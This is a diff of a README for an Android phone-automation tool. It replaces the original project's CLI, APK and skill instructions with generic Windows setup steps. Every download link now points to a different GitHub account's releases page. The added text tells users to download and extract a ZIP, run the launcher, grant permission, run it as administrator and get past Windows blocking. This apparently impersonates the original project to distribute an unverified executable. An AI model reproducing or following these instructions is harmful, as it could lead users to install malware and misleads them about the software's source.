@@ -1,153 +1,185 @@
-See the Chinese overview at [README_CN.md](README_CN.md).
+# 🤖 ai-rpa - Simple Android Automation for Everyone
 
-# AIVane AI RPA
+[![Download ai-rpa](https://img.shields.io/badge/Download%20ai--rpa-Visit%20Releases-blue?style=for-the-badge)](https://github.com/wildernessphilosophersstone247/ai-rpa/releases)
 
-Control an Android phone from your desktop or AI agent in minutes: inspect UI, tap, type, launch apps, and capture screenshots locally over LAN.
+## 📥 Download
 
-This repository is the public home for `aivanelabs/ai-rpa`. The current public surface is **AIVane Android REPL Beta**: a directly installable `agent-android` CLI plus a GitHub-installable `agent-android` skill for tools such as Codex, Claude Code, and OpenClaw.
+Visit the releases page to download and run ai-rpa on Windows:
 
-## Demo
+https://github.com/wildernessphilosophersstone247/ai-rpa/releases
 
-### Add a calendar event
+## 🖥️ What ai-rpa does
 
-https://github.com/user-attachments/assets/f4e48dd4-386c-4df5-936e-37c3fa650fd4
+ai-rpa helps you control an Android phone from your computer with a simple local setup. It gives you a starter app, a Python client, example skills, and protocol docs so you can try mobile automation with AI agents.
 
-### Search on Xiaohongshu
+Use it to:
 
-https://github.com/user-attachments/assets/7024b34b-73cd-4cc5-857e-90a84c341110
+- Open apps on an Android device
+- Tap, type, and move through screens
+- Test simple phone flows
+- Connect agent logic to mobile actions
+- Explore Android REPL beta features
+- Learn how UI automation works with a phone
 
-## Start Here
+## ✅ What you need
 
-- The beta already has a ready-to-install CLI and skill path; use the commands below instead of repo-local script paths.
-- Download APK: [GitHub Releases](https://github.com/aivanelabs/ai-rpa/releases)
-- Install CLI: `uv tool install aivane-agent-android`
-- Install skill: `npx skills add aivanelabs/ai-rpa --skill agent-android`
+Before you start, make sure you have:
 
-## 3-Step Quickstart
+- A Windows PC
+- An Android phone or tablet
+- A USB cable
+- Internet access for the download
+- Permission to use Developer options on the Android device
+- Enough free storage for the app and helper files
 
-1. Install the APK on your phone and enable the AIVane accessibility service.
-2. Install the CLI:
+## 🚀 Install on Windows
 
-```bash
-uv tool install aivane-agent-android
-```
+1. Open this page: https://github.com/wildernessphilosophersstone247/ai-rpa/releases
+2. Download the latest Windows file from the release assets.
+3. If the file is a ZIP package, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Run the Windows app or launcher file included in the package.
+6. If Windows asks for permission, choose Allow or Yes.
+7. Keep the app open while you set up your phone connection.
 
-If `agent-android` is not found afterwards, run:
+## 📱 Set up your Android device
 
-```bash
-uv tool update-shell
-```
+1. Unlock your Android device.
+2. Open Settings.
+3. Find About phone.
+4. Tap Build number seven times until Developer mode is enabled.
+5. Go back to Settings.
+6. Open Developer options.
+7. Turn on USB debugging.
+8. Connect your phone to your PC with a USB cable.
+9. On the phone, allow USB debugging when prompted.
 
-Then reopen the terminal. If you want the current shell to work immediately on Linux, run:
+## 🔌 Connect ai-rpa to your phone
 
-```bash
-export PATH="$HOME/.local/bin:$PATH"
-```
+1. Start ai-rpa on your Windows PC.
+2. Wait for the app to detect your Android device.
+3. If a device list appears, choose your phone.
+4. If the app asks for a connection method, select the default option first.
+5. Keep the phone unlocked during the first connection.
+6. If the screen stays blank, disconnect the cable and connect it again.
 
-3. Verify the device is reachable:
+## 🧭 First run
 
-```bash
-agent-android --health --url http://<device-ip>:8080
-```
+After setup, try a simple test:
 
-If that succeeds, start the REPL:
+1. Open the app.
+2. Connect your Android device.
+3. Load one of the example skills.
+4. Run a basic action like open app, tap button, or enter text.
+5. Watch the phone screen to confirm the action happened.
 
-```bash
-agent-android --repl --url http://<device-ip>:8080
-```
+If the test works, the setup is ready.
 
-## Choose A Path
+## 🧰 Included parts
 
-### For Humans
+This repo includes:
 
-Use the CLI directly when you want to manually explore the phone from your desktop:
+- Android REPL beta tools
+- Python client files
+- Skill examples
+- Mobile automation examples
+- Protocol docs for agents
+- UI automation samples
+- Starter files for local testing
 
-1. Download the APK from [GitHub Releases](https://github.com/aivanelabs/ai-rpa/releases)
-2. Install the CLI with `uv tool install aivane-agent-android`
-3. Run `agent-android --repl --url http://<device-ip>:8080`
-4. In the REPL, use the short loop: `health` -> `apps` -> `la <package>` -> `list` -> one action -> `list`
+## 🧪 Example uses
 
-### For AI Agents
+You can use ai-rpa for:
 
-Use the skill when you want Codex, Claude Code, or another coding agent to drive the phone:
+- Launching Android apps
+- Filling in form fields
+- Clicking through app screens
+- Testing login flows
+- Reading screen state with agent logic
+- Building phone tasks that repeat the same steps
+- Prototyping control flows for AI helpers
 
-1. Install the CLI with `uv tool install aivane-agent-android`
-2. Install the skill:
+## 🗂️ Suggested folder layout
 
-```bash
-npx skills add aivanelabs/ai-rpa --skill agent-android
-```
+You may see files like these after download:
 
-3. Give the agent a concrete task, for example:
+- `app` or `desktop` files for Windows
+- `examples` with sample tasks
+- `skills` with reusable actions
+- `docs` with protocol notes
+- `client` files for Python use
+- `android` or `repl` files for device control
 
-```text
-Use the installed agent-android skill to:
-1. check phone health
-2. list launcher apps
-3. launch Settings
-4. inspect visible UI nodes
-5. tap the Wi-Fi entry
-```
+## 🛠️ Common issues
 
-## First Success Path
+### Device not found
 
-This is the shortest practical smoke flow after the phone is reachable:
+- Check that the USB cable works
+- Use a data cable, not a charge-only cable
+- Confirm USB debugging is on
+- Unplug the phone and plug it back in
+- Accept the USB debugging prompt on the phone
 
-1. `agent-android --repl --url http://<device-ip>:8080`
-2. `set url http://<device-ip>:8080`
-3. `health`
-4. `apps`
-5. `la <package>`
-6. `list`
-7. `tap <refId>`
-8. `list`
+### App will not open
 
-If you want the full setup path, see [docs/install-agent-android.md](docs/install-agent-android.md) and [docs/quickstart.md](docs/quickstart.md).
+- Run the file again
+- Right-click and choose Run as administrator
+- Make sure Windows did not block the file
+- Re-download the release if the file seems broken
 
-## What This Beta Is
+### Phone does not respond
 
-- Local-first Android automation over LAN
-- Human-friendly REPL plus agent-friendly skill
-- Public CLI command: `agent-android`
-- Designed for inspect -> act -> inspect workflows
+- Keep the phone unlocked
+- Recheck the cable
+- Close other phone tools that may use the same connection
+- Restart the app and reconnect the device
 
-## What This Beta Is Not
+### Download looks empty
 
-- Not a cloud phone farm
-- Not remote control over arbitrary networks by default
-- Not iOS support
-- Not a visual recorder workflow yet
+- Open the releases page again
+- Make sure you chose the latest release
+- Look for the Windows asset, ZIP file, or installer file
 
-## Why The Phone Is The Web Server
+## 🧾 Basic workflow
 
-- The phone runs the lightweight HTTP service locally and the desktop connects directly to `http://<device-ip>:8080`.
-- UI inspection, taps, text input, and screenshots stay between the phone and the controlling machine.
-- The first smoke flow works without a cloud relay.
-- The tradeoff is that this beta is LAN-only.
+1. Download the Windows release
+2. Install or extract the package
+3. Turn on USB debugging on Android
+4. Connect the phone to the PC
+5. Open ai-rpa
+6. Pick an example skill
+7. Run a mobile action
+8. Adjust the skill for your own task
 
-## Install Sources
+## 🔐 Safety and device access
 
-- PyPI package: `aivane-agent-android`
-- Console command: `agent-android`
-- Skill: [`skills/agent-android/`](skills/agent-android/)
-- APK builds: [GitHub Releases](https://github.com/aivanelabs/ai-rpa/releases)
+ai-rpa controls your phone through your local connection. Keep the device unlocked while you test. Only run actions you understand. Review each example before you use it for personal tasks.
 
-## Repo Layout
+## 🧩 Python client use
 
-- `clients/python/`: publishable Python CLI package using a standard `src` layout
-- `docs/`: quickstart, install, protocol, permissions, release, and support docs
-- `docs/assets/`: README-linked media such as demo videos and screenshots
-- `examples/`: smoke-flow examples and launch helpers
-- `skills/agent-android/`: installable public skill definition
+If you want to use the Python client later, you can build on the included files to:
 
-## Additional Resources
+- Send device actions from Python
+- Load skills from a script
+- Chain steps into a longer phone task
+- Connect AI agent output to mobile control
 
-- [docs/quickstart.md](docs/quickstart.md)
-- [docs/install-agent-android.md](docs/install-agent-android.md)
-- [docs/agent-examples.md](docs/agent-examples.md)
-- [docs/release-checklist.md](docs/release-checklist.md)
-- [docs/known-limitations.md](docs/known-limitations.md)
+## 📚 Docs to read next
 
-## Contact
+Look through the repo docs for:
 
-For questions and light coordination, please email `aivanelabs@gmail.com`.
+- Protocol format
+- Skill examples
+- Android REPL notes
+- Client setup details
+- Action reference
+- UI automation patterns
+
+## ⌨️ Short setup path
+
+1. Go to https://github.com/wildernessphilosophersstone247/ai-rpa/releases
+2. Download the latest Windows release
+3. Extract or install the file
+4. Enable USB debugging on Android
+5. Connect the phone by USB
+6. Open ai-rpa and test one example skill
